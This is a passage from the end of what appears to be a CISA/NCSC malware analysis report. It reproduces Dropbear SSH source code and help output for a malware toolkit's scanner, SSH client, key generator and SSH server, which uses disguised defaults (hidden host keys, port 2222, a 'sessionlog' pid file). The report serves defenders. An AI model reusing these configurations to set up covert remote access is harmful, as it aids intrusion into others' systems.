<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; chansess<strong>-&gt;</strong>tty <strong>=</strong> m_strdup<strong>(</strong>namebuf<strong>);</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>if</strong> <strong>(!</strong>chansess<strong>-&gt;</strong>tty<strong>)</strong> <strong>{</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dropbear_exit<strong>(</strong>"Out of memory"<strong>);</strong> /* TODO disconnect */</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>}</strong></p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pw <strong>=</strong> getpwnam<strong>(</strong>ses<strong>.</strong>authstate<strong>.</strong>pw_name<strong>);</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>if</strong> <strong>(!</strong>pw<strong>)</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dropbear_exit<strong>(</strong>"getpwnam failed after succeeding previously"<strong>);</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pty_setowner<strong>(</strong>pw<strong>,</strong> chansess<strong>-&gt;</strong>tty<strong>);</strong></p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* Set up the rows/col counts */</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sessionwinchange<strong>(</strong>chansess<strong>);</strong></p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* Read the terminal modes */</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; get_termmodes<strong>(</strong>chansess<strong>);</strong></p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TRACE<strong>((</strong>"leave sessionpty"<strong>))</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>return</strong> DROPBEAR_SUCCESS<strong>;</strong></p>
<p><strong>}</strong></p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<h4>Nmap command line options</h4>
<table>
<tbody>
<tr>
<td>
<p>Usage nmap -ip* &lt;ip-addr: 192.168.0.1/ip-range: 192.168.0.0/24&gt; -p* &lt;port: 80/port-range: 25-125/top&gt; -udp &lt;default tcp&gt; -noping &lt;default yes&gt; -o &lt;out_file&gt; -t &lt;timeout&gt; &lt;-n&gt; &lt;-h/--help (print this help)</p>
</td>
</tr>
</tbody>
</table>
</div>
<p>&nbsp;</p>
<h4>Dropbear client [dbclient|ssh] command line options</h4>
<table>
<tbody>
<tr>
<td>
<p>Dropbear SSH client v2020.81 https://matt.ucc.asn.au/dropbear/dropbear.html</p>
<p>Usage: dbclient [options] [user@]host[/port][,[user@]host/port],...] [command]</p>
<p>-p &lt;remoteport&gt;</p>
<p>-l &lt;username&gt;</p>
<p>-t&nbsp;&nbsp;&nbsp; Allocate a pty</p>
<p>-T&nbsp;&nbsp;&nbsp; Don't allocate a pty</p>
<p>-N&nbsp;&nbsp;&nbsp; Don't run a remote command</p>
<p>-f&nbsp;&nbsp;&nbsp; Run in background after auth</p>
<p>-y&nbsp;&nbsp;&nbsp; Always accept remote host key if unknown</p>
<p>-y -y Don't perform any remote host key checking (caution)</p>
<p>-s&nbsp;&nbsp;&nbsp; Request a subsystem (use by external sftp)</p>
<p>-o option&nbsp;&nbsp;&nbsp;&nbsp; Set option in OpenSSH-like format ('-o help' to list options)</p>
<p>-i &lt;identityfile&gt;&nbsp;&nbsp; (multiple allowed, default .ssh/id_dropbear)</p>
<p>-A&nbsp;&nbsp;&nbsp; Enable agent auth forwarding</p>
<p>-L &lt;[listenaddress:]listenport:remotehost:remoteport&gt; Local port forwarding</p>
<p>-g&nbsp;&nbsp;&nbsp; Allow remote hosts to connect to forwarded ports</p>
<p>-R &lt;[listenaddress:]listenport:remotehost:remoteport&gt; Remote port forwarding</p>
<p>-W &lt;receive_window_buffer&gt; (default 24576, larger may be faster, max 1MB)</p>
<p>-K &lt;keepalive&gt;&nbsp; (0 is never, default 30)</p>
<p>-I &lt;idle_timeout&gt;&nbsp; (0 is never, default 1800)</p>
<p>-B &lt;endhost:endport&gt; Netcat-alike forwarding</p>
<p>-J &lt;proxy_program&gt; Use program pipe rather than TCP connection</p>
<p>-c &lt;cipher list&gt; Specify preferred ciphers ('-c help' to list options)</p>
<p>-m &lt;MAC list&gt; Specify preferred MACs for packet verification (or '-m help')</p>
<p>-b&nbsp;&nbsp; &nbsp;[bind_address][:bind_port]</p>
<p>-V&nbsp;&nbsp;&nbsp; Version</p>
<p>scp</p>
<p>usage: scp [-1246BCpqrv] [-c cipher] [-F ssh_config] [-i identity_file]</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [-l limit] [-P port] [-S program]</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [[user@]host1:]file1 [...] [[user@]host2:]file2</p>
<p>&nbsp;</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<h4>Dropbearkey command line options</h4>
<table>
<tbody>
<tr>
<td>
<p>Must specify a key filename</p>
<p>Usage: dropbearkey -t &lt;type&gt; -f &lt;filename&gt; [-s bits]</p>
<p>-t type&nbsp;&nbsp;&nbsp;&nbsp; Type of key to generate. One of:</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rsa</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dss</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ecdsa</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ed25519</p>
<p>-f filename&nbsp;&nbsp;&nbsp; Use filename for the secret key.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~/.ssh/id_dropbear is recommended for client keys.</p>
<p>-s bits&nbsp;&nbsp;&nbsp;&nbsp; Key size in bits, should be a multiple of 8 (optional)</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DSS has a fixed size of 1024 bits</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ECDSA has sizes 256 384 521</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Ed25519 has a fixed size of 256 bits</p>
<p>-y&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Just print the publickey and fingerprint for the</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private key in &lt;filename&gt;.</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<h4>Dropbear server command line options</h4>
<table>
<tbody>
<tr>
<td>
<p>Dropbear server v2020.81 https://matt.ucc.asn.au/dropbear/dropbear.html</p>
<p>Usage: dropbear [options]</p>
<p>-b bannerfile&nbsp;&nbsp;&nbsp;&nbsp; Display the contents of bannerfile before user login</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (default: none)</p>
<p>-r keyfile&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Specify hostkeys (repeatable)</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; defaults:</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - dss /tmp/sessions.log.d/dropbear_dss_host_key</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - rsa /tmp/sessions.log.d/dropbear_rsa_host_key</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - ecdsa /tmp/sessions.log.d/dropbear_ecdsa_host_key</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - ed25519 /tmp/sessions.log.d/dropbear_ed25519_host_key</p>
<p>-R&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Create hostkeys as required</p>
<p>-F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Don't fork into background</p>
<p>(Syslog support not compiled in, using stderr)</p>
<p>-w&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Disallow root logins</p>
<p>-G&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Restrict logins to members of specified group</p>
<p>-s&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Disable password logins</p>
<p>-g&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Disable password logins for root</p>
<p>-B&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Allow blank password logins</p>
<p>-T&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Maximum authentication tries (default 10)</p>
<p>-j&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Disable local port forwarding</p>
<p>-k&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Disable remote port forwarding</p>
<p>-a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Allow connections to forwarded ports from any host</p>
<p>-c command&nbsp; Force executed command</p>
<p>-p [address:]port</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Listen on specified tcp port (and optionally address),</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; up to 10 can be specified</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (default port is 2222 if none specified)</p>
<p>-P PidFile&nbsp; Create pid file PidFile</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (default /var/run/sessionlog.pid)</p>
<p>-i&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Start for inetd</p>
<p>-W &lt;receive_window_buffer&gt; (default 24576, larger may be faster, max 1MB)</p>
<p>-K &lt;keepalive&gt;&nbsp; (0 is never, default 30, in seconds)</p>
<p>-I &lt;idle_timeout&gt;&nbsp; (0 is never, default 1800, in seconds)</p>
<p>-V&nbsp;&nbsp;&nbsp; Version</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap>
<thead>
<tr>
<th scope="col" role="columnheader" data-tablesaw-priority="persist">
<h2>Disclaimer</h2>
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>This report draws on information derived from NCSC and industry sources. Any NCSC findings and recommendations made have not been provided with the intention of avoiding all risks and following the recommendations will not remove all such risk. Ownership of information risks remains with the relevant system owner at all times.</p>
<p>This information is exempt under the Freedom of Information Act 2000 (FOIA) and may be exempt under other UK information legislation.</p>
<p>Refer any FOIA queries to <a href="mailto:ncscinfoleg@ncsc.gov.uk">ncscinfoleg@ncsc.gov.uk</a>.</p>
<p>All material is UK Crown Copyright ©</p>
<p>&nbsp;</p>
</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>

      </div>

  
      </div>
  </div>
      <div class="l-constrain l-page-section--rich-text">
        <div class="l-page-section__content">
          




<div  class="c-field c-field--name-body c-field--type-text-with-summary c-field--label-hidden">
  <div class="c-field__content"><p>This product is provided subject to this&nbsp;<a href="/notification" rel="nofollow noopener" target="_blank" title="Follow link">Notification</a>&nbsp;and this&nbsp;<a href="/privacy-policy" rel="nofollow noopener" target="_blank" title="Follow link">Privacy &amp; Use</a>&nbsp;policy.</p></div></div>

        </div>
      </div>
            </div>
        <div class="l-full__footer">
                              
<div class="l-constrain">
  <div class="l-page-section--rich-text">
    <div class="l-page-section__content">
      <div  class="c-product-survey l-page-section--tags l-page-section--rich-text">
        <div class="c-product-survey__top-bar"></div>
        <div class="c-product-survey__content-area">
          <div class="c-product-survey__icon"></div>
          <div class="c-product-survey__text-area">
            <h2>Please share your thoughts</h2>
            <p>We recently updated our anonymous <a href="https://cisasurvey.gov1.qualtrics.com/jfe/form/SV_9n4TtB8uttUPaM6?product=https://www.cisa.gov/news-events/analysis-reports/ar23-243a" target="_blank">product survey</a>; we’d welcome your feedback.</p>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>
          

          </div>
  </div>
  
  
  
  

      </div>

  
  </main>

  
<footer  class="usa-footer usa-footer--slim" role="contentinfo">
    <div class="usa-footer__return-to-top">
    <div class="l-constrain">
      <a href="#">Return to top</a>
    </div>
  </div>
    <div class="usa-footer__upper">
    <div class="l-constrain">
      







  
  
    

  
            

                                <ul  class="c-menu c-menu--footer-main">
        
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="/topics" class="c-menu__link js-top-level" aria-current="false" data-drupal-link-system-path="node/7329">Topics</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="/spotlight" class="c-menu__link js-top-level" aria-current="false" data-drupal-link-system-path="node/7330">Spotlight</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="/resources-tools" class="c-menu__link js-top-level" aria-current="false" data-drupal-link-system-path="node/7331">Resources &amp; Tools</a>
                        </li>
    
                                            
                                                    
      
      
      <li  class="c-menu__item is-active-trail">
                              <a href="/news-events" class="c-menu__link js-top-level is-active-trail" aria-current="false" data-drupal-link-system-path="node/7332">News &amp; Events</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="/careers" class="c-menu__link js-top-level" aria-current="false" data-drupal-link-system-path="node/7323">Careers</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="/about" class="c-menu__link js-top-level" aria-current="false" data-drupal-link-system-path="node/6944">About</a>
                        </li>
        </ul>
  

  
  
  
  

    </div>
  </div>
    <div class="usa-footer__main">
    <div class="l-constrain">
      <div class="usa-footer__main-row">
        <div class="usa-footer__brand">
          
<a  class="c-site-name c-site-name--footer" href="/" rel="home" title="Go to the Cybersecurity & Infrastructure Security Agency homepage">
  <span class="c-site-name__text">Cybersecurity &amp; Infrastructure Security Agency</span>
</a>        </div>
        <div class="usa-footer__contact">
                      

                                <ul  class="c-menu c-menu--social">
        
                                            
                                                            
      
      
      <li  class="c-menu__item">
                              <a href="https://www.facebook.com/CISA" class="c-menu__link--facebook c-menu__link js-top-level" aria-current="false">Facebook</a>
                        </li>
    
                                            
                                                            
      
      
      <li  class="c-menu__item">
                              <a href="https://twitter.com/CISAgov" class="c-menu__link--twitter c-menu__link js-top-level" aria-current="false">Twitter</a>
                        </li>
    
                                            
                                                            
      
      
      <li  class="c-menu__item">
                              <a href="https://www.linkedin.com/company/cybersecurity-and-infrastructure-security-agency" class="c-menu__link--linkedin c-menu__link js-top-level" aria-current="false">LinkedIn</a>
                        </li>
    
                                            
                                                            
      
      
      <li  class="c-menu__item">
                              <a href="https://www.youtube.com/@cisagov" class="c-menu__link--youtube c-menu__link js-top-level" aria-current="false">YouTube</a>
                        </li>
    
                                            
                                                            
      
      
      <li  class="c-menu__item">
                              <a href="https://www.instagram.com/cisagov" class="c-menu__link--instagram c-menu__link js-top-level" aria-current="false">Instagram</a>
                        </li>
    
                                            
                                                            
      
      
      <li  class="c-menu__item">
                              <a href="/subscribe-updates-cisa" class="c-menu__link--rss c-menu__link js-top-level" aria-current="false">RSS</a>
                        </li>
        </ul>
  

                    <div class="usa-footer__contact-info">
            <span>CISA Central</span>
            <a href="tel:1-844-Say-CISA">1-844-Say-CISA</a>
            <a href="mailto:SayCISA@cisa.dhs.gov">SayCISA@cisa.dhs.gov</a>
          </div>
        </div>
      </div>
    </div>
  </div>
    <div class="usa-footer__lower">
    <div class="l-constrain">
      <div class="usa-footer__lower-row">
        <div class="usa-footer__lower-left">
          
<div  class="c-dhs-logo">
  <div class="c-dhs-logo__seal">DHS Seal</div>
  <div class="c-dhs-logo__content">
    <div class="c-dhs-logo__url">CISA.gov</div>
    <div class="c-dhs-logo__text">An official website of the U.S. Department of Homeland Security</div>
  </div>
</div>                      


                                <ul  class="c-menu c-menu--footer">
        
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="/about" class="c-menu__link js-top-level" title="About CISA" aria-current="false" data-drupal-link-system-path="node/6944">About CISA</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="https://www.dhs.gov/performance-financial-reports" class="c-menu__link js-top-level" title="Budget and Performance" aria-current="false">Budget and Performance</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="https://www.dhs.gov" title="Department of Homeland Security" class="c-menu__link js-top-level" aria-current="false">DHS.gov</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="/oedia" title="Equal Opportunity &amp; Accessibility" class="c-menu__link js-top-level" aria-current="false" data-drupal-link-system-path="node/21462">Equal Opportunity &amp; Accessibility</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="https://www.dhs.gov/foia" class="c-menu__link js-top-level" title="FOIA Requests" aria-current="false">FOIA Requests</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="/no-fear-act" title="No FEAR Act Reporting" class="c-menu__link js-top-level" aria-current="false" data-drupal-link-system-path="node/21494">No FEAR Act</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="https://www.oig.dhs.gov/" class="c-menu__link js-top-level" title="Office of Inspector General" aria-current="false">Office of Inspector General</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="/privacy-policy" class="c-menu__link js-top-level" title="Privacy Policy" aria-current="false" data-drupal-link-system-path="node/16115">Privacy Policy</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="https://public.govdelivery.com/accounts/USDHSCISA/subscriber/new?topic_id=USDHSCISA_138" title="Subscribe to Email Updates" class="c-menu__link js-top-level" aria-current="false">Subscribe</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="https://www.whitehouse.gov/" class="c-menu__link js-top-level" title="The White House" aria-current="false">The White House</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="https://www.usa.gov/" class="c-menu__link js-top-level" title="USA.gov" aria-current="false">USA.gov</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="/forms/feedback" title="Website Feedback" class="c-menu__link js-top-level" aria-current="false" data-drupal-link-system-path="forms/feedback">Website Feedback</a>
                        </li>
        </ul>
  

                  </div>
        <div class="usa-footer__lower-right">
          <iframe
            src="https://www.dhs.gov/ntas/"
            name="National Terrorism Advisory System"
            title="National Terrorism Advisory System"
            width="170"
            height="180"
            scrolling="no"
            frameborder="0"
            seamless border="0"
          ></iframe>
        </div>
      </div>
    </div>
  </div>
</footer>

  

</div>

  </div>

    
        <script src="/profiles/cisad8_gov/themes/custom/gesso/dist/js/common.js?sltso8"></script>
<script src="/profiles/cisad8_gov/themes/custom/gesso/dist/js/uswds-init.es6.js?sltso8"></script>
<script src="/profiles/cisad8_gov/themes/custom/gesso/dist/js/uswds.es6.js?sltso8"></script>
<script src="https://dap.digitalgov.gov/Universal-Federated-Analytics-Min.js?agency=DHS&amp;subagency=CISA&amp;yt=true" id="_fed_an_ua_tag"></script>
<script src="/modules/contrib/extlink/extlink.js?v=10.3.5"></script>
<script src="/modules/contrib/ckeditor_accordion/js/accordion.frontend.min.js?sltso8"></script>
<script src="/modules/contrib/responsive_tables_filter/js/tablesaw.min.js?v=1.x"></script>
<script src="/modules/contrib/responsive_tables_filter/js/tablesaw-init.js?v=1.x"></script>
<script src="/modules/contrib/responsive_tables_filter/js/Drupal/ajaxComplete.js?v=1.x"></script>
<script src="/modules/contrib/responsive_tables_filter/js/customizations.js?v=1.x"></script>
<script src="/profiles/cisad8_gov/themes/custom/gesso/dist/js/file.es6.js?sltso8"></script>

  </body>
</html>
